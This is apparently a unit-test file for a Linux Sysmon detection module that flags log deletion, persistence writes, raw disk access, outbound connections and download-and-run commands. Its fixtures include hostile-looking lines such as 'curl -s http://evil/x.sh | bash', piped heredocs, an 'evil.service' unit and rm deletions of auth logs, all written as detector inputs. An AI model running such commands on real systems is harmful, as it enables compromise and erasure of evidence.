import os
import tempfile
import unittest
from datetime import datetime, timezone
from unittest import mock

from jarvis.collectors.telemetry import sysmon_linux
from jarvis.core.store import Store
from jarvis.core.util import now


class SysmonHealthTests(unittest.TestCase):
    def test_xml_retains_journal_time_separately_from_lagging_payload_time(self):
        text = """<Event><System><EventID>1</EventID>
        <TimeCreated SystemTime="2026-09-04T12:07:02.426568000Z"/>
        </System><EventData>
        <Data Name="UtcTime">2026-09-04 11:17:40.544</Data>
        <Data Name="Image">/usr/bin/example</Data>
        </EventData></Event>"""

        event = sysmon_linux._parse(text)[0]

        self.assertEqual(event["SystemTime"],
                         "2026-09-04T12:07:02.426568000Z")
        expected = datetime(2026, 9, 4, 12, 7, 2, 426568,
                            tzinfo=timezone.utc).timestamp()
        self.assertAlmostEqual(sysmon_linux._event_utc(event), expected,
                               places=5)

    def test_gap_detection_uses_journal_time_not_lagging_payload_time(self):
        since = datetime(2026, 9, 4, 12, 0, tzinfo=timezone.utc).timestamp()
        event = {
            "id": 1,
            "SystemTime": "2026-09-04T12:10:01.000000000Z",
            "UtcTime": "2026-09-04 11:17:40.544",
        }

        findings = sysmon_linux._health([event], since, incremental=True)

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["title"],
                         "Sysmon journal rotated past the last read position")

    def test_text_record_payload_time_remains_a_supported_fallback(self):
        event = {"UtcTime": "2026-09-04 12:07:02.426568"}
        expected = datetime(2026, 9, 4, 12, 7, 2, 426568,
                            tzinfo=timezone.utc).timestamp()

        self.assertEqual(sysmon_linux._event_utc(event), expected)


class SysmonRawAccessTests(unittest.TestCase):
    def test_unresolved_devices_remain_visible_without_claiming_disk_reads(self):
        for device in ('c', '-', '', '<unknown>', '/', 'relative-device'):
            with self.subTest(device=device):
                out = sysmon_linux._rules([{'id':9, 'Image':'/usr/bin/tee',
                                            'Device':device}])
                self.assertEqual(out[0]['severity'], 'medium')
                self.assertEqual(out[0]['title'], sysmon_linux.RAW_UNRESOLVED_TITLE)
                self.assertIn('not established', out[0]['detail'])

    def test_real_device_path_is_high_even_for_tee(self):
        for image in ('/usr/bin/tee', '/usr/bin/dd', '/tmp/tee'):
            for device in ('/dev/sda', '/dev/nvme0n1', '/dev/mapper/root', '/tmp/disk-node'):
                with self.subTest(image=image, device=device):
                    out = sysmon_linux._rules([{'id':9, 'Image':image, 'Device':device}])
                    self.assertEqual(out[0]['severity'], 'high')
                    self.assertIn('read/write direction', out[0]['detail'])

    def test_process_context_requires_guid_not_reused_pid(self):
        create = {'id':1, 'Image':'/usr/bin/tee', 'ProcessId':'698',
                  'ProcessGuid':'{process-a}', 'CommandLine':'tee -a /home/u/keepalive.log'}
        event = {'id':9, 'Image':'/usr/bin/tee', 'ProcessId':'698',
                 'ProcessGuid':'{process-a}', 'Device':'c'}
        self.assertIn(create['CommandLine'], sysmon_linux._rules([create,event])[0]['detail'])
        event['ProcessGuid'] = '{process-b}'
        self.assertNotIn(create['CommandLine'], sysmon_linux._rules([create,event])[0]['detail'])

    def test_legacy_unresolved_hit_is_reclassified_without_refreshing_its_age(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, 'jarvis.db'))
            ts = now() - 600
            store.db.execute('''INSERT INTO sysmon_hits
                (ts,category,severity,title,detail,where_) VALUES(?,?,?,?,?,?)''',
                (ts, 'sysmon-linux', 'high', sysmon_linux.RAW_ACCESS_TITLE,
                 'tee opened c' + sysmon_linux.RAW_LEGACY_SUFFIX, sysmon_linux.CHANNEL))
            store.commit()
            out = sysmon_linux._remember(store, [], 24)
            self.assertEqual(len(out), 1)
            self.assertEqual(out[0]['severity'], 'medium')
            self.assertEqual(store.db.execute('SELECT ts FROM sysmon_hits').fetchone()[0], ts)
            store.close()

    def test_legacy_real_device_is_not_cleared(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, 'jarvis.db'))
            store.db.execute('''INSERT INTO sysmon_hits
                (ts,category,severity,title,detail,where_) VALUES(?,?,?,?,?,?)''',
                (now(), 'sysmon-linux', 'high', sysmon_linux.RAW_ACCESS_TITLE,
                 'tee opened /dev/sda' + sysmon_linux.RAW_LEGACY_SUFFIX, sysmon_linux.CHANNEL))
            store.commit()
            out = sysmon_linux._remember(store, [], 24)
            self.assertEqual(out[0]['severity'], 'high')
            store.close()


class SysmonLogDeletionTests(unittest.TestCase):
    def test_journald_rotating_its_archived_segment_is_not_an_alert(self):
        event = {
            "id": 23,
            "Image": "/usr/lib/systemd/systemd-journald",
            "TargetFilename": (
                "/var/log/journal/be5aebaf1e26404686aac5ad4351c165/"
                "system@3b914056b83f4ad68ebbd0efbc94388f-"
                "000000000025aa14-00065aa6c60e8085.journal"),
        }

        self.assertEqual(sysmon_linux._rules([event]), [])

    def test_shell_deleting_the_same_journal_segment_stays_high(self):
        event = {
            "id": 23,
            "Image": "/usr/bin/bash",
            "TargetFilename": "/var/log/journal/machine/system@1-2.journal",
        }

        findings = sysmon_linux._rules([event])

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "high")
        self.assertEqual(findings[0]["title"], sysmon_linux.LOG_DELETE_TITLE)

    def test_journald_deleting_an_unowned_log_stays_high(self):
        event = {
            "id": 26,
            "Image": "/usr/lib/systemd/systemd-journald",
            "TargetFilename": "/var/log/auth.log",
        }

        findings = sysmon_linux._rules([event])

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "high")

    def test_remember_forgets_a_preexisting_rotation_alert(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, "jarvis.db"))
            detail = (
                "systemd-journald deleted /var/log/journal/machine/"
                "system@1-2.journal — indicator removal")
            store.db.execute(
                """INSERT INTO sysmon_hits
                   (ts,category,severity,title,detail,where_)
                   VALUES(?,?,?,?,?,?)""",
                (int(datetime.now(timezone.utc).timestamp()), "sysmon-linux",
                 "high", sysmon_linux.LOG_DELETE_TITLE, detail,
                 sysmon_linux.CHANNEL))
            store.commit()

            self.assertEqual(sysmon_linux._remember(store, [], 24), [])
            count = store.db.execute(
                "SELECT COUNT(*) FROM sysmon_hits").fetchone()[0]
            self.assertEqual(count, 0)
            store.close()

    def test_compressor_removing_a_numbered_generation_is_not_an_alert(self):
        for target in ("/var/log/dmesg.0", "/var/log/syslog.7.gz",
                       "/var/log/apt/history.log.3.xz"):
            event = {"id": 23, "Image": "/usr/bin/gzip",
                     "TargetFilename": target}
            self.assertEqual(sysmon_linux._rules([event]), [], target)

    def test_deleting_a_live_log_by_name_stays_high(self):
        # No numbered generation: destruction, not rotation.
        event = {"id": 23, "Image": "/usr/bin/gzip",
                 "TargetFilename": "/var/log/auth.log"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")

    def test_rm_of_a_rotated_log_stays_high(self):
        # rm is not a rotation tool — a compressor packs and removes, rm only
        # removes.
        event = {"id": 26, "Image": "/usr/bin/rm",
                 "TargetFilename": "/var/log/dmesg.0"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")


    def test_savelog_removing_its_oldest_generation_is_not_an_alert(self):
        guid = "{be5aebaf-1111-2222-3333-444455556666}"
        start = {"id": 1, "ProcessGuid": guid, "Image": "/usr/bin/rm",
                 "CommandLine": "rm -f -- /var/log/dmesg.4.gz",
                 "ParentImage": "/usr/bin/dash",
                 "ParentCommandLine": "/bin/sh /usr/bin/savelog -m640 -q -p -n -c 5 /var/log/dmesg"}
        delete = {"id": 26, "ProcessGuid": guid, "Image": "/usr/bin/rm",
                  "TargetFilename": "/var/log/dmesg.4.gz"}
        self.assertNotIn(sysmon_linux.LOG_DELETE_TITLE,
                         [f["title"] for f in sysmon_linux._rules([start, delete])])

    def test_rm_from_savelog_of_a_live_log_stays_high(self):
        guid = "{be5aebaf-1111-2222-3333-444455556667}"
        start = {"id": 1, "ProcessGuid": guid, "Image": "/usr/bin/rm",
                 "ParentCommandLine": "/bin/sh /usr/bin/savelog /var/log/dmesg"}
        delete = {"id": 26, "ProcessGuid": guid, "Image": "/usr/bin/rm",
                  "TargetFilename": "/var/log/auth.log"}
        self.assertIn(sysmon_linux.LOG_DELETE_TITLE,
                      [f["title"] for f in sysmon_linux._rules([start, delete])])


class SysmonPersistenceTests(unittest.TestCase):
    def test_snapd_rewriting_its_own_mount_unit_is_not_an_alert(self):
        for target in (
                "/etc/systemd/system/snap-terraform-928.mount",
                "/etc/systemd/system/snap-terraform-928.mount.3Qwhl8fbp9hk~"):
            event = {"id": 11, "Image": "/usr/lib/snapd/snapd",
                     "TargetFilename": target}
            self.assertEqual(sysmon_linux._rules([event]), [], target)

    def test_snapd_writing_a_non_snap_unit_stays_high(self):
        event = {"id": 11, "Image": "/usr/lib/snapd/snapd",
                 "TargetFilename": "/etc/systemd/system/evil.service"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")
        self.assertEqual(findings[0]["title"], sysmon_linux.PERSIST_WRITE_TITLE)

    def test_another_writer_touching_a_snap_unit_name_stays_high(self):
        event = {"id": 11, "Image": "/usr/bin/bash",
                 "TargetFilename":
                     "/etc/systemd/system/snap-terraform-928.mount"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")

    def test_remember_forgets_a_preexisting_snapd_persistence_alert(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, "jarvis.db"))
            detail = ("snapd created/modified /etc/systemd/system/"
                      "snap-terraform-928.mount.3Qwhl8fbp9hk~")
            store.db.execute(
                """INSERT INTO sysmon_hits
                   (ts,category,severity,title,detail,where_)
                   VALUES(?,?,?,?,?,?)""",
                (int(datetime.now(timezone.utc).timestamp()), "sysmon-linux",
                 "high", sysmon_linux.PERSIST_WRITE_TITLE, detail,
                 sysmon_linux.CHANNEL))
            store.commit()

            self.assertEqual(sysmon_linux._remember(store, [], 24), [])
            count = store.db.execute(
                "SELECT COUNT(*) FROM sysmon_hits").fetchone()[0]
            self.assertEqual(count, 0)
            store.close()


class SysmonTableIsolationTests(unittest.TestCase):
    def test_windows_sysmon_does_not_re_emit_linux_rows(self):
        from jarvis.collectors.telemetry import sysmon
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, "jarvis.db"))
            store.db.execute(
                """INSERT INTO sysmon_hits
                   (ts,category,severity,title,detail,where_)
                   VALUES(?,?,?,?,?,?)""",
                (int(datetime.now(timezone.utc).timestamp()), "sysmon-linux",
                 "high", sysmon_linux.LOG_DELETE_TITLE,
                 "gzip deleted /var/log/x — indicator removal",
                 sysmon_linux.CHANNEL))
            store.commit()

            out = sysmon._remember(store, [], 24)
            self.assertEqual(
                [f for f in out if f["category"] == "sysmon-linux"], [])
            store.close()


if __name__ == "__main__":
    unittest.main()


class HarnessUnwrapTests(unittest.TestCase):
    """The agent harness's own scaffolding must never be read as the command.

    Measured on a live journal before the fix: 9 of 26 harness-wrapped events
    failed to unwrap and were content-matched raw, which is how a routine
    `cat` produced a HIGH "download-and-run in a command line" alert.
    """

    SNAP = ("/bin/bash -c source /home/u/.claude/shell-snapshots/snap-1.sh "
            "2>/dev/null || true && shopt -u extglob 2>/dev/null || true && "
            "{{ \\builtin unalias -- 'x'; \\builtin unset -f -- 'x'; }} "
            ">/dev/null 2>&1 || true && eval '{real}'")

    def _wrap(self, real, terminator):
        return self.SNAP.format(real=real) + terminator

    def test_single_line_shape_ends_at_dev_null(self):
        cmd = self._wrap("cat /tmp/out.txt",
                         " < /dev/null && pwd -P >| /tmp/claude-1-cwd")
        self.assertEqual(sysmon_linux._payload(cmd), "cat /tmp/out.txt")

    def test_multi_line_shape_has_no_dev_null_and_still_unwraps(self):
        cmd = self._wrap("python3 - <<'PY'\nprint(1)\nPY",
                         " && pwd -P >| /tmp/claude-2-cwd")
        self.assertEqual(sysmon_linux._payload(cmd),
                         "python3 - <<'PY'\nprint(1)\nPY")

    def test_a_truncated_wrapper_still_yields_the_command_not_the_scaffolding(self):
        cmd = self.SNAP.format(real="curl http://x/a.sh | sh")   # no terminator
        payload = sysmon_linux._payload(cmd)
        self.assertNotIn("shell-snapshots", payload)
        self.assertNotIn("builtin unalias", payload)
        self.assertIn("curl http://x/a.sh | sh", payload)

    def test_scaffolding_alone_never_trips_the_download_rule(self):
        cmd = self._wrap("cat /tmp/out.txt",
                         " < /dev/null && pwd -P >| /tmp/claude-3-cwd")
        self.assertFalse(sysmon_linux.DOWNLOAD_RUN.search(
            sysmon_linux._payload(cmd)))

    def test_a_real_payload_inside_the_wrapper_is_still_caught(self):
        cmd = self._wrap("curl -s http://evil/x.sh | bash",
                         " < /dev/null && pwd -P >| /tmp/claude-4-cwd")
        self.assertTrue(sysmon_linux.DOWNLOAD_RUN.search(
            sysmon_linux._payload(cmd)))

    def test_a_non_harness_command_line_is_returned_untouched(self):
        cmd = "/usr/bin/curl -s http://example/x.sh | sh"
        self.assertEqual(sysmon_linux._payload(cmd), cmd)

    def test_bash_apostrophe_escaping_is_undone(self):
        cmd = self._wrap("echo it" + sysmon_linux._SQ_ESCAPE + "s fine",
                         " < /dev/null")
        self.assertEqual(sysmon_linux._payload(cmd), "echo it's fine")


class GoBuildTest(unittest.TestCase):
    def test_go_test_binary_is_dev_not_high(self):
        img = '/tmp/tmp/go-build392567114/b216/routing.test'
        out = sysmon_linux._rules([{'id': 1, 'Image': img,
                                    'CommandLine': img + ' -test.paniconexit0'}])
        self.assertEqual([f['severity'] for f in out], ['medium'])

    def test_plain_tmp_binary_stays_high(self):
        out = sysmon_linux._rules([{'id': 1, 'Image': '/tmp/b216/routing.test'}])
        self.assertEqual([f['severity'] for f in out], ['high'])


class SysmonEgressTests(unittest.TestCase):
    def conn(self, image, ip="93.184.216.34", port="443"):
        return {"id": 3, "Image": image, "DestinationIp": ip, "DestinationPort": port}

    def test_expected_programs_are_judged_by_their_own_name(self):
        # Event 3 has no ParentImage; the allowlist was checked against it.
        self.assertEqual([f for f in sysmon_linux._rules([self.conn("/usr/bin/node")])
                          if f["title"].startswith("outbound")], [])

    def test_one_finding_per_program_not_per_address(self):
        events = [self.conn("/opt/x/cloudflared", ip) for ip in
                  ("93.184.216.34", "93.184.216.35", "93.184.216.36")]
        out = [f for f in sysmon_linux._rules(events) if f["title"].startswith("outbound")]
        self.assertEqual([(f["severity"], f["title"]) for f in out],
                         [("medium", "outbound connections from cloudflared")])
        self.assertIn("3 public destination", out[0]["detail"])

    def test_unresolved_process_is_a_visibility_gap(self):
        out = [f for f in sysmon_linux._rules([self.conn("")]) if f["title"].startswith("outbound")]
        self.assertEqual([f["severity"] for f in out], ["low"])


class HeredocTests(unittest.TestCase):
    def run_cmd(self, cmd):
        e = {"id": 1, "Image": "/usr/bin/bash", "CommandLine": cmd, "ParentImage": "/usr/bin/node"}
        return [f["title"] for f in sysmon_linux._rules([e])]

    def test_quoted_heredoc_body_is_data(self):
        cmd = "cd /x && cat > t.test.ts <<'EOF'\nconst s = 'curl https://e.x/i.sh | sh';\nEOF\necho done"
        self.assertNotIn("download-and-run in a command line", self.run_cmd(cmd))

    def test_code_outside_or_in_unquoted_heredoc_still_counts(self):
        self.assertIn("download-and-run in a command line",
                      self.run_cmd("cat > a <<'EOF'\nx\nEOF\ncurl https://e.x/i.sh | sh"))
        self.assertIn("download-and-run in a command line",
                      self.run_cmd("cat > a <<EOF\n$(curl https://e.x/i.sh | sh)\nEOF"))

    def test_quoted_heredoc_read_by_a_shell_or_interpreter_still_counts(self):
        # The quoted-heredoc exemption was a bypass: these run their body.
        body = "\ncurl https://e.x/i.sh | sh\nE"
        for head in ("bash <<'E'", "cat <<'E' | sh", "sudo sh -s <<\"E\"", "python3 - <<'E'",
                     "ssh host <<'E'", "cd /tmp; /bin/dash <<-'E'", "su - root <<\\E"):
            self.assertIn("download-and-run in a command line", self.run_cmd(head + body), head)
        # Writing a file stays data, including through sudo tee.
        for head in ("cat > t.ts <<'E'", "sudo tee /etc/x.conf <<'E'"):
            self.assertNotIn("download-and-run in a command line", self.run_cmd(head + body), head)


class PublicAddressTests(unittest.TestCase):
    def test_unspecified_and_mapped_private_addresses_are_not_public(self):
        from jarvis.collectors.telemetry.sysmon_linux.rules import _is_public_ip
        for ip in ("0:0:0:0:0:0:0:0", "0:0:0:0:0:ffff:ac12:5", "::ffff:10.0.0.1",
                   "fe80::1", "::1", "100.64.0.1", "172.20.1.1", "", "junk"):
            self.assertFalse(_is_public_ip(ip), ip)
        for ip in ("160.79.104.10", "2606:4700::1", "0:0:0:0:0:ffff:a04f:680a"):
            self.assertTrue(_is_public_ip(ip), ip)


class StoredEgressRejudgeTests(unittest.TestCase):
    def test_only_complete_non_public_lists_are_dropped(self):
        from jarvis.collectors.telemetry.sysmon_linux.run import _no_public_destination as drop
        self.assertTrue(drop("1 public destination(s): 0:0:0:0:0:0:0:0:0 — confirm"))
        self.assertTrue(drop("2 public destination(s): 0:0:0:0:0:ffff:ac12:5:8080, "
                             "0:0:0:0:0:ffff:ac12:7:8080 — confirm"))
        self.assertFalse(drop("1 public destination(s): 160.79.104.10:443 — confirm"))
        self.assertFalse(drop("6 public destination(s): 10.0.0.1:443 — confirm"))  # truncated
        self.assertFalse(drop("garbled"))


class PersistenceLocationTests(unittest.TestCase):
    def test_only_effective_locations_count(self):
        from unittest import mock

        from jarvis.collectors.telemetry.sysmon_linux import rules
        with mock.patch.object(rules, "_account_homes", return_value={"/home/u", "/root"}):
            for path in ("/home/u/.config/systemd/user/x.service", "/root/.bashrc",
                         "/home/u/.ssh/authorized_keys", "/etc/systemd/system/x.service",
                         "/etc/systemd/user/x.service", "/etc/cron.d/job"):
                self.assertTrue(rules.persistence_location(path), path)
            for path in ("/tmp/t/.config/systemd/user/x.service", "/tmp/etc/cron.d/job",
                         "/home/u/proj/.bashrc", "/home/u/../u2/.bashrc"):
                self.assertFalse(rules.persistence_location(path), path)


class DmesgRotationTests(unittest.TestCase):
    def test_unparented_rm_inside_a_dmesg_service_run_is_rotation(self):
        from unittest import mock

        from jarvis.collectors.telemetry.sysmon_linux import rules
        with mock.patch.object(rules, "_dmesg_windows", return_value=[(1000.0, 1015.0)]):
            ok = rules._expected_log_maintenance
            self.assertTrue(ok("rm", "/var/log//dmesg.4.gz", "", 1006.0))
            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", 2000.0))      # outside the run
            self.assertFalse(ok("rm", "/var/log/auth.log", "", 1006.0))        # not a dmesg generation
            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", None))        # no time, no proof
            # inside the run window, an rm with a visible non-rotation parent is not the unit's
            self.assertFalse(ok("rm", "/var/log/dmesg.2.gz", "bash -c rm /var/log/dmesg.2.gz", 1006.0))
            self.assertFalse(ok("rm", "/var/log/dmesg.2.gz", "/tmp/x/wipe.sh", 1006.0))
            self.assertTrue(ok("rm", "/var/log/dmesg.4.gz", "/bin/sh /usr/bin/savelog -c 5 /var/log/dmesg", 1006.0))

    def test_either_clock_inside_the_run_proves_rotation_but_the_window_is_not_widened(self):
        from unittest import mock

        from jarvis.collectors.telemetry.sysmon_linux import rules
        with mock.patch.object(rules, "_dmesg_windows", return_value=[(1000.0, 1015.0)]):
            ok = rules._expected_log_maintenance
            # ingestion lagged by the boot backlog, kernel time inside the run
            self.assertTrue(ok("rm", "/var/log/dmesg.4.gz", "", (1090.0, 1006.0)))
            # kernel clock drifted after standby, ingestion inside the run
            self.assertTrue(ok("rm", "/var/log/dmesg.4.gz", "", (1006.0, 1290.0)))
            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", (1090.0, 1290.0)))
            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", (1021.0, 994.0)))
            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", ()))
            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", ("1006", None)))
            self.assertFalse(ok("rm", "/var/log/syslog.1", "", (1090.0, 1006.0)))
            self.assertFalse(ok("rm", "/var/log/dmesg.2.gz", "bash -c rm /var/log/dmesg.2.gz",
                                (1090.0, 1006.0)))

    def _boot_rm(self, created, kernel):
        return {"id": 26, "ProcessGuid": "{be5aebaf-0000-0000-0000-000000000026}",
                "Image": "/usr/bin/rm", "TargetFilename": "/var/log//dmesg.4.gz",
                "SystemTime": created, "UtcTime": kernel}

    def test_boot_backlog_lag_no_longer_reports_rotation_as_indicator_removal(self):
        from unittest import mock

        from jarvis.collectors.telemetry.sysmon_linux import rules
        start = datetime(2026, 9, 24, 14, 13, 51, tzinfo=timezone.utc).timestamp()
        with mock.patch.object(rules, "_dmesg_windows", return_value=[(start, start + 8)]):
            lagged = self._boot_rm("2026-09-24T14:14:40.000000000Z", "2026-09-24 14:13:53.100")
            self.assertNotIn(sysmon_linux.LOG_DELETE_TITLE,
                             [f["title"] for f in sysmon_linux._rules([lagged])])
            outside = self._boot_rm("2026-09-24T14:14:40.000000000Z", "2026-09-24 14:14:39.900")
            self.assertIn(sysmon_linux.LOG_DELETE_TITLE,
                          [f["title"] for f in sysmon_linux._rules([outside])])
            unreadable = self._boot_rm("", "not a time")
            self.assertIn(sysmon_linux.LOG_DELETE_TITLE,
                          [f["title"] for f in sysmon_linux._rules([unreadable])])


class DmesgUnitWindowFallbackTests(unittest.TestCase):
    """Sysmon volume rotates the journal within the hour; the dmesg.service
    run window must then come from systemd's unit timestamps instead."""

    def _windows(self, journal, unit):
        from unittest import mock

        from jarvis.collectors.telemetry.sysmon_linux import rules

        def run(cmd, **kw):
            out = journal if cmd[0] == "journalctl" else unit
            return mock.Mock(stdout=out)
        rules._DMESG_WINDOWS.clear()
        try:
            with mock.patch.object(rules.subprocess, "run", side_effect=run):
                return rules._dmesg_windows()
        finally:
            rules._DMESG_WINDOWS.clear()

    def test_rotated_journal_falls_back_to_unit_timestamps(self):
        unit = "InactiveExitTimestamp=@1000\nInactiveEnterTimestamp=@1015\n"
        self.assertEqual(self._windows("-- No entries --\n", unit), [(1000.0, 1015.0)])

    def test_journal_window_is_preferred_when_present(self):
        journal = ("1000.0 h systemd[1]: Starting dmesg.service - Save kernel messages...\n"
                   "1012.0 h systemd[1]: dmesg.service: Deactivated successfully.\n")
        unit = "InactiveExitTimestamp=@5000\nInactiveEnterTimestamp=@5010\n"
        self.assertEqual(self._windows(journal, unit), [(1000.0, 1012.0)])

    def test_missing_or_implausible_unit_window_gives_no_exemption(self):
        for unit in ("", "InactiveExitTimestamp=\nInactiveEnterTimestamp=\n",
                     "InactiveExitTimestamp=@1000\nInactiveEnterTimestamp=@9000\n",
                     "InactiveExitTimestamp=@1015\nInactiveEnterTimestamp=@1000\n"):
            self.assertEqual(self._windows("", unit), [], unit)


class CursorContinuity(unittest.TestCase):
    """The incremental cursor moves only after a successful read (evidence continuity)."""

    def _store(self):
        import tempfile

        from jarvis.core.store import Store
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        return Store(os.path.join(self.tmp.name, "j.db"))

    def _audit(self, store, read):
        from jarvis.collectors.telemetry.sysmon_linux import run as runmod
        with mock.patch.object(runmod, "state", return_value=(True, True)), \
                mock.patch.object(runmod, "read_since", side_effect=read), \
                mock.patch.object(runmod, "now", return_value=10_000):
            return runmod.audit(store=store, incremental=True)

    def test_a_failed_read_keeps_the_cursor_and_says_so(self):
        store = self._store()
        store.set_meta("sysmon_linux_last", 5_000)
        out = self._audit(store, lambda since: (None, False, "journalctl did not answer within 40 s"))
        self.assertEqual(int(store.get_meta("sysmon_linux_last", 0)), 5_000)
        titles = [f["title"] for f in out]
        self.assertIn("Linux Sysmon events not read this pass", titles)

    def test_the_next_pass_reads_the_same_window_again(self):
        store = self._store()
        store.set_meta("sysmon_linux_last", 5_000)
        seen = []
        self._audit(store, lambda since: (seen.append(since), (None, False, "timeout"))[1])
        self._audit(store, lambda since: (seen.append(since), ("", True, ""))[1])
        self.assertEqual(seen, [5_000, 5_000])
        self.assertEqual(int(store.get_meta("sysmon_linux_last", 0)), 10_000)

    def test_a_good_read_advances_to_the_read_start(self):
        store = self._store()
        out = self._audit(store, lambda since: ("", True, ""))
        self.assertEqual(int(store.get_meta("sysmon_linux_last", 0)), 10_000)
        self.assertNotIn("Linux Sysmon events not read this pass", [f["title"] for f in out])


class JournalRead(unittest.TestCase):
    def _run(self, stdout="", rc=0, exc=None):
        def run(*a, **kw):
            if exc:
                raise exc
            return mock.Mock(stdout=stdout, returncode=rc)
        return run

    def test_timeout_is_a_failed_read_not_an_empty_one(self):
        import subprocess

        from jarvis.collectors.telemetry.sysmon_linux import journal
        text, ok, why = journal.read_since(0, run=self._run(exc=subprocess.TimeoutExpired("journalctl", 40)),
                                           syslog=lambda: ("old", False))
        self.assertEqual((text, ok), (None, False))
        self.assertIn("40 s", why)

    def test_failed_journal_without_syslog_is_failed_but_empty_journal_is_fine(self):
        from jarvis.collectors.telemetry.sysmon_linux import journal
        self.assertFalse(journal.read_since(0, run=self._run(rc=1), syslog=lambda: (None, False))[1])
        self.assertEqual(journal.read_since(0, run=self._run(rc=0), syslog=lambda: (None, False))[:2], ("", True))

    def test_syslog_read_is_capped_to_its_tail(self):
        import tempfile

        from jarvis.collectors.telemetry.sysmon_linux import journal
        with tempfile.NamedTemporaryFile("w", delete=False) as fh:
            fh.write("sysmon old\n" * 1000 + "sysmon newest\n")
        self.addCleanup(os.unlink, fh.name)
        text, capped = journal._syslog(fh.name, cap=200)
        self.assertTrue(capped)
        self.assertLessEqual(len(text), 200)
        self.assertTrue(text.endswith("sysmon newest"))
